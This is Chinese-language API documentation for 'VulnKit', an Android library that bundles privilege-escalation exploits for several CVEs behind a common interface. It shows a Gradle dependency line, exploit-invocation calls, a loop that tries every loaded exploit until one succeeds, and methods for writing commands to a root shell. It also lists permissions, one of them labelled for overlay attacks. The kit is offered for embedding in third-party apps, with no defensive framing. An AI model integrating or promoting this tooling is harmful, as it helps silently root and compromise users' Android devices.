# VulnKit API 文档

本文档供第三方应用调用 VulnKit 提供的漏洞利用接口使用。

## 引入依赖
在 `build.gradle` 中添加：
```gradle
dependencies {
    implementation 'org.dpdns.sqxy090123:VulnKit:1.0.0'
}
```

## 核心接口

### 1. `IExploit` 接口
所有漏洞类均实现此接口。

```java
public interface IExploit {
    boolean isVulnerable();
    boolean exploit(Context context);
    String getName();
    String getDescription();
    String getTag();
    int getColor();
}
```

### 2. `ExploitLoader` 工具类
动态加载所有漏洞实现。

```java
List<IExploit> exploits = ExploitLoader.loadAllExploits();
```

### 3. `JNIInterface` 静态方法
提供 Native 提权和 Root Shell 管理。

#### 提权方法
```java
// 各漏洞独立 native 调用
int result = JNIInterface.cve20192215();
boolean success = JNIInterface.cve202538352_exploit();
boolean success = JNIInterface.cve20260107_exploit();
boolean success = JNIInterface.cve202621385_exploit();
boolean success = JNIInterface.cve202443093_setuidZero();
```

#### Root Shell 管理
```java
// 启动 root shell（需当前进程已是 root）
int startRootShell();

// 写入命令
int writeRootShell(String cmd);

// 读取输出（阻塞）
String readRootShell();

// 关闭 shell
void closeRootShell();

// 检查是否可用
boolean isRootShellAvailable();
```

## 使用示例

### 检查设备是否受 CVE-2019-2215 影响
```java
IExploit exploit = new CVE_2019_2215();
if (exploit.isVulnerable()) {
    exploit.exploit(context);
}
```

### 动态加载并执行所有可用漏洞
```java
List<IExploit> exploits = ExploitLoader.loadAllExploits();
for (IExploit exp : exploits) {
    if (exp.isVulnerable()) {
        exp.exploit(context);
        break; // 成功一个即可
    }
}
```

### 手动启动 Root Shell
```java
if (JNIInterface.startRootShell() == 0) {
    JNIInterface.writeRootShell("id");
    String output = JNIInterface.readRootShell();
    Log.i("RootShell", output);
    JNIInterface.closeRootShell();
}
```

## 权限要求
第三方应用需要声明以下权限（部分需动态申请）：
- `android.permission.WRITE_EXTERNAL_STORAGE`
- `android.permission.INTERNET`
- `android.permission.SYSTEM_ALERT_WINDOW`（用于覆盖层攻击）
- `android.permission.BLUETOOTH`（用于蓝牙相关漏洞）

## 注意事项
- 调用 `exploit()` 方法会直接执行漏洞利用，可能导致系统崩溃，请在安全环境中测试。
- Root Shell 管理方法仅在当前进程已获得 root 权限时有效。
- 部分漏洞需要用户交互（如 CVE-2024-0044 需选择目标应用），请参阅源码实现。

## 错误码
| 返回值 | 含义 |
|-------|------|
| 0 | 成功 |
| -1 | 失败（一般错误） |
| -2 | 权限不足 |
| -3 | 设备不受影响 |

## 版本历史
- 1.0.0 (2026-04-02) : 初始重构版本，移除 CVE-2024-31317，增加反射加载。